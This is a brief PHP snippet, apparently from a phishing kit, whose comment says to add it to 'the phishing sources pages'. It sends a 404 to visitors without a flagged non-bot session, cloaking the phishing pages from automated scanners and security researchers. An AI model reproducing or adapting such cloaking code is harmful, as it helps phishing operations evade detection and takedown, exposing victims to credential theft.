
// Add this to the phishing sources pages to block users who don't have a active session
<?php
session_start();
if ($_SESSION['bot'] !== false) {
  http_response_code(404);
  die();
}
?>
